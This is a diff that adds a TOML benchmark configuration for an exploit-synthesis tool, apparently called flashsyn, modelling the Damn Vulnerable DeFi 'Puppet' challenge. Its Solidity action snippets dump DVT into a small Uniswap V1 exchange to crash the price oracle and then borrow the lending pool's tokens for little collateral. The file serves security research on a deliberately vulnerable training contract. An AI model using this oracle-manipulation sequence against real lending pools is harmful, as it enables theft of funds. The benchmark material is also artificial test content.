@@ -1,0 +1,76 @@
+# Damn Vulnerable DeFi — Puppet (V1). Scenario is deployed locally in setUp(), so the
+# fork block is arbitrary (any archive block the RPC serves). Declarative benchmark:
+# the flashsyn CLI builds the action model from this file; the Solidity harness (with
+# setUp / interfaces / profitSummary) lives next to it in attack.t.sol.
+
+name = "puppet"
+contract = "Puppet"      # --match-contract name in attack.t.sol
+chain = "ETH"
+block = 16818064
+max_synthesis_len = 3
+
+# Profit = (final - initial) * price over these, in profitSummary() output order.
+profit_tokens = ["DVT", "ETH"]
+
+# Attacker starts with 1000 DVT and 25 ETH — must match setUp() in attack.t.sol.
+[initial_balances]
+DVT = 1000
+ETH = 25
+
+# ETH weighed 1000, DVT 1 (same relative scale as the DVD challenge).
+[token_prices]
+ETH = 1000.0
+DVT = 1.0
+
+# token -> [contract variable in the harness, decimals]. Only DVT has an ERC20
+# balanceOf; ETH is native, so ETH-out actions carry a raw `collector` below.
+[token_info]
+DVT = ["dvt", 18]
+
+# Dump DVT into the tiny Uniswap V1 exchange — this is what crashes the oracle.
+# Output is native ETH (no balanceOf), so the collector is written out.
+[[actions]]
+name = "SwapUniswapDVT2ETH"
+tokens_in = ["DVT"]
+tokens_out = ["ETH"]
+range = [0, 1000]                          # can't sell more DVT than the attacker holds
+solidity = "uniswapExchange.tokenToEthSwapInput($$ * 1e18, 1, 0xffffffff);"
+collector = """
+        // Collect: SwapUniswapDVT2ETH
+        uint _eth0 = address(attacker).balance;
+        uniswapExchange.tokenToEthSwapInput($$ * 1e18, 1, 0xffffffff);
+        revert(Strings.append("FlashSyn: ", (address(attacker).balance - _eth0) / 1e18));
+"""
+
+# Buy DVT back with ETH (the reverse leg). Output is the DVT ERC20, so the default
+# balanceOf collector and the default transit (ETH -= param, DVT += approx) both apply.
+[[actions]]
+name = "SwapUniswapETH2DVT"
+tokens_in = ["ETH"]
+tokens_out = ["DVT"]
+range = [0, 25]
+solidity = "uniswapExchange.ethToTokenSwapInput{value: $$ * 1e18}(1, 0xffffffff);"
+
+# Borrow DVT from the pool. Inverts the default model: the search parameter is the DVT
+# RECEIVED, while the ETH collateral is a function of the manipulated oracle and so must
+# be APPROXIMATED (and measured input-side) — hence both escape-hatch fields.
+[[actions]]
+name = "PoolBorrow"
+tokens_in = ["ETH"]                        # collateral paid (approximated), not the param
+tokens_out = ["DVT"]                       # borrowed amount == the search param
+range = [0, 100000]                        # up to the pool's whole 100k DVT reserve
+solidity = """
+        _amt = $$ * 1e18;
+        _dep = puppetPool.calculateDepositRequired(_amt);
+        puppetPool.borrow{value: _dep}(_amt);"""
+collector = """
+        // Collect: PoolBorrow — measure the ETH collateral spent (the approximated quantity)
+        _amt = $$ * 1e18;
+        _dep = puppetPool.calculateDepositRequired(_amt);
+        puppetPool.borrow{value: _dep}(_amt);
+        revert(Strings.append("FlashSyn: ", _dep / 1e18));
+"""
+effects = [
+  { token = "DVT", op = "add", src = "param0" },   # received == the parameter
+  { token = "ETH", op = "sub", src = "approx0" },   # collateral == the approximation
+]
